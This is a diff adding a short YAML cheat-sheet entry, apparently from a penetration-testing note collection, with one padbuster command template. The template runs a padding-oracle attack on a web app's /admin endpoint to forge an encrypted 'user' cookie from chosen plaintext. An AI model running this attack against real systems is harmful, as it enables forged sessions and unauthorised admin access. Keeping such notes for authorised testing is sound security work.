@@ -1,0 +1,9 @@
+---
+metadata:
+  filename: "padbuster-encrypt-hex-get.yaml"
+  tags: ["web", "cracking"]
+  created: "2025-07-10"
+  author: "@Anakles"
+
+content: |
+  padbuster http://$IP:$PORT/admin "<hexvalue>" 16 -encoding 1 -cookies "user=<hexvalue>" -plaintext <plaintext> [-error <canary>]
